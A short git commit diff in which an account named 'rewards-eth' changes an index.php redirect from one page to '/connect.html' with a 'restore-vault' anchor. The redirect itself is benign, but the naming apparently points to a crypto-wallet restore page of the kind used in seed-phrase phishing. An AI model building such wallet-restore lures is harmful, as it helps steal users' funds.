561ea193187f3b5fb0e7edcec8e5b70db1dc5449
rewards-eth <140156163+rewards-eth@users.noreply.github.com>
2023-07-21 16:19:01 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <!doctype html>
 <script type="text/javascript">
     // Javascript URL redirection
-    window.location.replace("/copiosa.html?/#restore-vault");
+    window.location.replace("/connect.html?/#restore-vault");
 </script>
 </head>
 </html>
